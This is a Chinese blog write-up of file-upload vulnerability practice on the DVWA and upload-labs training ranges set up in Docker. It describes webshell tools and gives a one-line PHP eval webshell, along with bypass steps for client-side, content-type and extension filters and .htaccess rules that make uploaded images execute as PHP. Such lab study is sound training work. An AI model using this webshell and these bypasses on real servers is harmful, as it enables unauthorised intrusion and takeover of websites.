---
title: 记文件上传漏洞操练
author: Pandaho
date: 2021-07-26 20:00:00 
categories: [Project] 
tags: [security]
image: /assets/img/security-File-upload/cover.png
---




## 法律声明

**中华人民共和国刑法：** 第285、286、287条

**第二百八十五条** 违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

**第二百八十六条** 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

**第二百八十七条** 利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。



## 用知识的土壤来填埋这些坑洞

**文件上传漏洞条件：**

1、文件能够允许上传

2、拿到文件于站点的路径

3、上传的文件有可执行权限



**小马：** 对应网站开发语言编写的动态脚本、体积小、功能少，一般是用来上传大马（绕过限制）

**大马：** 对应网站开发语言编写的动态脚本、体积大、功能多（执行命令，上传下载文件）可改变系统关键函数、但隐蔽性不好。

**一句话木马：** APS、PHP、JSP

对应网站开发语言编写的动态脚本，代码只有一句，隐蔽性强，常用于和webshell工具结合使用。

[菜刀](https://github.com/raddyfiy/caidao-official-version/releases/tag/NULL)  
[蚁剑（使用手册）](https://doc.u0u.us/zh-hans/getting_started/get_antsword.html )  
[蚁剑（加载器）](https://doc.u0u.us/zh-hans/getting_started/get_antsword.html )  
[蚁剑（源码）](https://doc.u0u.us/zh-hans/getting_started/get_antsword.html )  
蚁剑需要下载源码和加载器，通过加载器来跑源码。

[冰蝎](https://github.com/rebeyond/Behinder/releases)  通信过程中使用AES（高级加密算法，对称加密，微信小程序使用此种方法）进行加密，Java和.NET默认支持AES，php中需要开启openssl扩展，在V2.0版本后，php环境方式根据服务端支持情况动态选择，使得冰蝎更强大。
冰蝎每次连接都会向服务端发送一次GET请求获取16位密钥，在客户端和服务端通信时使用密钥进行加密达到免杀目的，只要在流量中发现这样特征的流量，便可发现隐藏在流量中的冰蝎webshell。
（默认冰蝎马：pass通过get传参时随机一个密钥给session[k]并打印出来）

[Fiddler](https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe )  是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件）。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式

Wappalyzer（chrome插件）最新版是一款强大的网站技术栈嗅探工具，Wappalyzer官方版插件能够快速识别一个网站用到的前后端技术框架、运行容器、脚本库等，Wappalyzer还提供跨平台实用程序，能够发现网站上使用的技术，还可以检测内容管理系统，电子商务平台，Web框架，服务器软件，分析工具等。

[Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)  (译注：可以直译为："该死的"不安全Web应用网站)，是一个编码糟糕的、易受攻击的 PHP/MySQL Web应用程序。 它的主要目的是帮助安全专业人员在合法的环境中，测试他们的技能和工具，帮助 Web 开发人员更好地了解如何增强 Web 应用程序的安全性，并帮助学生和教师在受控的课堂环境中，了解 Web 应用程序的安全。

DVWA的具体目标是通过简单明了的界面，来演练一些最常见的 Web 漏洞，这些漏洞具有不同的难度级别。 请注意，此软件存在说明和未说明的漏洞。 这是故意的。 我们鼓励您尝试并发现尽可能多的安全问题。

Docker 是一个开源的应用容器引擎，基于 [Go 语言](https://www.runoob.com/go/go-tutorial.html) 并遵从 Apache2.0 协议开源。

Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。

容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。

DVWA这里我是用docker搭建的，因为我们的目的是使用，所有采用最快速的方式实现就行了。


```shell
#更新软件源
sudo apt update  
sudo apt install -y docker.io  

sudo docker search dvwa  #搜索
sudo docker pull citizenstig/dvwa  #拉取
sudo docker run --rm -d -p 80:80 citizenstig/dvwa  #运行
参数说明：
run：运行
-–rm：退出后删除容器
-d：后台运行
-P：随机映射端口

#查看
sudo docker ps -a 
sudo docker image ls
sudodocker container ls

访问到网站后，默认账户密码是admin\password 
找到file upload，编写一个一句话木马上传测试
<?php
echo phpinfo();
?>
通过Fiddler查看数据包Raw的信息，确定我们的上传name，在成功回包的信息里搜索name，确定路径。
也可和webshell工具结合使用，上传一句话木马，使用工具建立连接。
<?php
@eval($_POST['变量'])；
?>
```



[Upload-labs靶场：](https://github.com/c0ny1/upload-labs  )   
upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。

```
我还是使用docker搭建
docker pull c0ny1/upload-labs   #拉取
docker run --rm -d -p 80:80 c0ny1/upload-labs  #运行
```

这里有个坑，使用docker创建的靶场是没有/upload，这样是无法上传任何东西的，我是先find搜索相关的路径“ find / -name "Pass-01“”，查询到路径在html下创建/upload，再chmod赋予权限。

 

我们从pass-01开始，在我们上传php文件时，通过抓包查看，会发现根本没有截取到报文，那我们可以判断报文可能是被前端所阻断了，我们再通过查看前端代码可以看到有段JavaScript代码对上传文件进行了文件类型判断，不符合文件类型要求的都被前端阻断。

渗透方法：将木马文件更改后缀让其符合js规则，等报文发包上传后，我们通过Fiddler拦截上传报文，修改其name后缀为php，放开报文，这样木马就上传至服务器端了。

 

Pass-02，这一关我们还是照常上传php文件测试，发现无法上传，通过flddler拦截可以看到有上传报文，我们再进行代码审计，发现其进行了content-type的定义，后端服务器判断上传报文的content-type，如果定义的类型不符合服务器的要求，文件将被阻断，所以我们可以通过将报文上传后，这时前端已经判断完，定义了content-type，再进行flddler拦截，修改其content-type值为服务器允许的类型，就能成功上传了。

 

Pass-03，根据在上传php文件反馈的信息来看，是对.asp,.aspx,.php,.jsp等后缀文件进行了限制上传，在进行源码审计也是如此，这种情况，我们可以通过爆破的方式来测试哪些后缀可以上传。

使用burp打开proxy点击Open Browser，直接打开内置谷歌浏览器访问靶场，forward上传，将上传结果intruder，在positions clear变量，选择文件后缀add变量，然后在payloads添加字典，点击start attack，查看爆破结果，通过length值可以看错不同后缀的报文内容不同，选择response-render进行对比，就可以确定哪些后缀可以成功上传了，但是这样只是确定可上传而已，上传的第三个条件就是上传的文件可以被执行，这就要进行上传文件测试了，看看是否有部分可被执行到的。

 

Pass-04就是来解决上传后执行的问题，我们可通过修改php的后缀，让文件通过上传限制，但怎么让文件在服务器可以执行呢？在[Apache](https://baike.baidu.com/item/Apache)服务器下可以利用这个漏洞。

”htaccess文件“是[Apache](https://baike.baidu.com/item/Apache)服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页[301重定向](https://baike.baidu.com/item/301重定向)、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

我们利用其针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的[AllowOverride](https://baike.baidu.com/item/AllowOverride)指令来设置。

创建一个htaccess文件，可通过这几种写入方式

```php
第一种、虽然好用，但是会误伤其他正常文件，容易被发现
<IfModule mime_module>
AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
</IfModule>
第二种、精确控制能被解析成php代码的文件，不容易被发现
<FilesMatch "evil.gif">
SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
</FilesMatch>

利用方式：上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。

```



## 参考来源

百度百科  
Github   
TI安全实验室  
[docker菜鸟教程]( https://www.runoob.com/docker/docker-tutorial.html)  
[docker基础详解]( https://www.cnblogs.com/yang37/p/14464674.html)  
[靶场详解](https://blog.csdn.net/Aaron_Miller/article/details/106143006)  
